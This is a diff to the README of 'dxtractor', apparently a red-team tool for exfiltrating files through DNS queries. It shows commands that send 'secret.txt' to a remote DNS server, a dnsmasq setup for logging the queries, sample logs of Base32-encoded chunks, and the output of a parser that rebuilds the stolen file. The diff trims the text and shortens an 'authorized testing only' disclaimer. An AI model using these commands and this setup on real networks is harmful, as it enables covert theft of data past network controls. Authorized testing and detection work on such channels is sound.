@@ -66,27 +66,10 @@ dxtractor <file> <domain> <dns_server> [-p port] [-d delay] [-c chunk]
 
 ## Examples
 
-Basic:
-
 ```
 dxtractor secret.txt dnstest.test 10.10.10.10
-```
-
-With delay:
-
-```
 dxtractor secret.txt dnstest.test 10.10.10.10 -d 1
-```
-
-Custom chunk:
-
-```
 dxtractor secret.txt dnstest.test 10.10.10.10 -c 32
-```
-
-Full control:
-
-```
 dxtractor secret.txt dnstest.test 10.10.10.10 -p 53 -d 1 -c 24
 ```
 
@@ -118,10 +101,6 @@ x86_64-w64-mingw32-gcc dns_extractor_windows.c -o dxtractor.exe -lws2_32
 
 ## DNS Receiver Setup (dnsmasq)
 
-dxtractor relies on a DNS server that logs incoming queries.
-
----
-
 ### Example configuration
 
 Edit:
@@ -148,91 +127,49 @@ address=/dnstest.test/<DNS_SERVER_IP>
 
 ---
 
-### Replace values
-
-| Field             | Description                           |
-| ----------------- | ------------------------------------- |
-| `<DNS_SERVER_IP>` | Your DNS listener IP                  |
-| `<INTERFACE>`     | Network interface (e.g., eth0, ens33) |
-
----
-
-## Start dnsmasq
+## Start & Validate
 
 ```
 sudo systemctl restart dnsmasq
-```
-
----
-
-## Validate service
-
-```
 sudo systemctl status dnsmasq
 ```
 
-Expected:
-
-```
-Active: active (running)
-```
-
 ---
 
-## Monitor incoming queries
+## Monitor Logs
 
 ```
 sudo tail -f /var/log/dnsmasq.log
 ```
 
-Expected output:
+---
+
+## Example DNS Logs
 
 ```
-query[A] 0.1234.IFBEGRCF...dnstest.test from 192.168.1.50
+query[A] 0.4321.IFBEGRCFIZDUQSKKJNGE2===.dnstest.test from 10.10.10.5
+query[A] 1.4321.MFRGGZDFMZTWQ2LKNNWG====.dnstest.test from 10.10.10.5
+query[A] 2.4321.OBQXE43UOJQXE3LFON2XEZJO.dnstest.test from 10.10.10.5
+query[A] 999.4321.END.dnstest.test from 10.10.10.5
 ```
 
 ---
 
-## Functional validation
-
-Before exfiltration, confirm DNS resolution:
-
-```
-nslookup test.dnstest.test <DNS_SERVER_IP>
-```
-
-Expected:
-
-```
-Name: test.dnstest.test
-Address: <DNS_SERVER_IP>
-```
-
----
-
-## Running dxtractor
-
-```
-./dxtractor file.txt dnstest.test <DNS_SERVER_IP>
-```
-
-You should observe live DNS queries being logged.
-
----
-
-## Data reconstruction
-
-Use the provided parser:
+## Parser Example
 
 ```
 python3 parser.py
 ```
 
-The parser:
+Output:
 
-* Extracts Base32 chunks
-* Reorders them using sequence numbers
-* Decodes the original file
+```
+[+] Session detected: 4321
+[+] Total chunks: 3
+[+] Reassembling data...
+[+] Decoding Base32...
+[+] File written: recovered_4321.bin
+```
 
 ---
 
@@ -385,9 +322,7 @@ This allows full control over payload structure.
 
 ## Disclaimer
 
-This project is intended for **educational purposes and authorized security testing only**.
-
-Unauthorized use may violate laws and policies.
+Educational use only. Authorized environments only.
 
 ---
 
